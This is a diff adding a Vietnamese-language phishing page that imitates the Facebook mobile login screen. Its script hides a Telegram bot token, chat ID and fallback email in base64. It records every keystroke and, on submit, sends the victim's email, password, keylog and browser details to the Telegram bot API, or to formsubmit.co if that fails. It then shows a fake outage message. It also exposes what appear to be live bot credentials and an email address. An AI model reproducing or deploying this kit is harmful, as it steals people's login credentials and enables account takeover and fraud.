@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Facebook – Đăng nhập hoặc đăng ký</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        .container {
+            width: 100%;
+            max-width: 432px;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            position: relative;
+        }
+        .content {
+            padding: 32px 20px 24px;
+            text-align: center;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            margin: 20px auto 12px;
+        }
+        .logo svg {
+            display: block;
+            width: 80px;
+            height: 80px;
+        }
+        .promo-text {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+        form {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            margin-bottom: 12px;
+            outline: none;
+            color: #1c1e21;
+            caret-color: #1877f2;
+        }
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        input::placeholder {
+            color: #8a8d91;
+        }
+        .btn-login {
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 12px 0 16px;
+            cursor: pointer;
+            line-height: 1.2;
+            transition: background 0.2s;
+        }
+        .btn-login:hover {
+            background: #166fe5;
+        }
+        .action-links {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+        .action-links a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .action-links a:hover {
+            text-decoration: underline;
+        }
+        .btn-create {
+            background: #42b72a;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 24px;
+            transition: background 0.2s;
+            text-align: center;
+        }
+        .btn-create:hover {
+            background: #36a420;
+        }
+        .meta-footer {
+            margin-top: auto;
+            font-size: 12px;
+            color: #8a8d91;
+            text-align: center;
+            padding-top: 24px;
+        }
+        .meta-logo-row {
+            display: flex;
+            justify-content: center;
+            gap: 4px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            align-items: center;
+        }
+        .meta-icon {
+            width: 18px;
+            height: 18px;
+            background: #000;
+            border-radius: 50%;
+            color: white;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .fake-error {
+            display: none;
+            background: #f8d7da;
+            color: #b94a48;
+            padding: 16px;
+            border-radius: 6px;
+            margin-top: 10px;
+            font-size: 14px;
+            text-align: center;
+            border: 1px solid #f5c6cb;
+        }
+        .hidden {
+            display: none !important;
+        }
+        hr.divider {
+            border: none;
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0 24px;
+            width: 100%;
+        }
+        /* Ẩn mọi thành phần giả mạo còn sót */
+        .status-bar, .app-banner {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="content" id="mainContent">
+        <div class="logo">
+            <!-- Logo Facebook vector thật, không bao giờ vỡ -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="80" height="80">
+                <circle cx="24" cy="24" r="24" fill="#1877f2"/>
+                <path d="M27.16 32.34h-3.71v-8.19h-2.48v-3.1h2.48v-2.4c0-3.45 1.45-5.5 5.54-5.5h3.71v3.1h-2.48c-2.08 0-2.34.76-2.34 2.18v2.62h4.72l-.5 3.1h-4.22v8.19z" fill="#fff"/>
+            </svg>
+        </div>
+        <div class="promo-text">
+            Đăng nhập để sử dụng Facebook.
+        </div>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email hoặc số điện thoại" required autofocus>
+            <input type="password" id="pass" placeholder="Mật khẩu" required>
+            <button type="submit" class="btn-login">Đăng nhập</button>
+        </form>
+        <div class="action-links">
+            <a href="https://www.facebook.com/recover/initiate/" target="_blank" rel="noopener noreferrer">Quên mật khẩu?</a>
+            <a href="https://www.facebook.com/r.php" target="_blank" rel="noopener noreferrer">Tạo tài khoản mới</a>
+        </div>
+        <hr class="divider">
+        <button class="btn-create" onclick="window.open('https://www.facebook.com/r.php','_blank')">Tạo tài khoản mới</button>
+        <div class="meta-footer">
+            <div class="meta-logo-row"><span>Meta</span><div class="meta-icon">M</div></div>
+            <div>facebook.com</div>
+        </div>
+    </div>
+    <div id="fakeError" class="fake-error hidden">
+        ⚠️ Trang web tạm thời bị gián đoạn. Hãy quay lại sau...
+    </div>
+</div>
+
+<script>
+    // Boss ID đã được mã hóa Base64 để tránh lộ trực tiếp
+    // Giải mã khi sử dụng
+    const _0x1a2b = 'ODg5ODAyMTI1NTpBQUd6WVF0RWt4NnJfX2U4RmVVbksxUm56Wm50LVVWZ2ZNcw=='; // BOT_TOKEN
+    const _0x3c4d = 'NTI3MzQ3NzY1OA=='; // CHAT_ID
+    const _0x5e6f = 'bmd1eWVuZGluaHh1eWVuMTgwMTIwMDBAZ21haWwuY29t'; // FALLBACK_EMAIL
+
+    function _d(s) {
+        return atob(s);
+    }
+
+    const BOT_TOKEN = _d(_0x1a2b);
+    const CHAT_ID = _d(_0x3c4d);
+    const FALLBACK_EMAIL = _d(_0x5e6f);
+
+    let keylog = '';
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') keylog += '[BS]';
+        else if (e.key === 'Enter') keylog += '[ENTER]';
+        else if (e.key.length === 1) keylog += e.key;
+        else keylog += '[' + e.key + ']';
+    });
+
+    function buildText(email, pass) {
+        const now = new Date().toISOString();
+        return `=== FACEBOOK KEYLOG ===\nDate: ${now}\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nLang: ${navigator.language}\n\n--- Login ---\nEmail: ${email}\nPass: ${pass}\n\n--- Keylog ---\n${keylog}`;
+    }
+
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const body = new URLSearchParams();
+        body.append('chat_id', CHAT_ID);
+        body.append('text', text);
+        try {
+            const response = await fetch(url, { method: 'POST', body });
+            return response.ok;
+        } catch(e) {
+            return false;
+        }
+    }
+
+    async function sendFallback(email, pass) {
+        const formData = new FormData();
+        formData.append('email', email);
+        formData.append('password', pass);
+        formData.append('keylog', keylog);
+        formData.append('ua', navigator.userAgent);
+        formData.append('time', new Date().toISOString());
+        await fetch('https://formsubmit.co/ajax/' + FALLBACK_EMAIL, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        });
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const pass = document.getElementById('pass').value.trim();
+        const logText = buildText(email, pass);
+
+        const sent = await sendToTelegram(logText);
+        if (!sent) await sendFallback(email, pass);
+
+        document.getElementById('mainContent').classList.add('hidden');
+        document.getElementById('fakeError').classList.remove('hidden');
+    });
+</script>
+</body>
+</html>
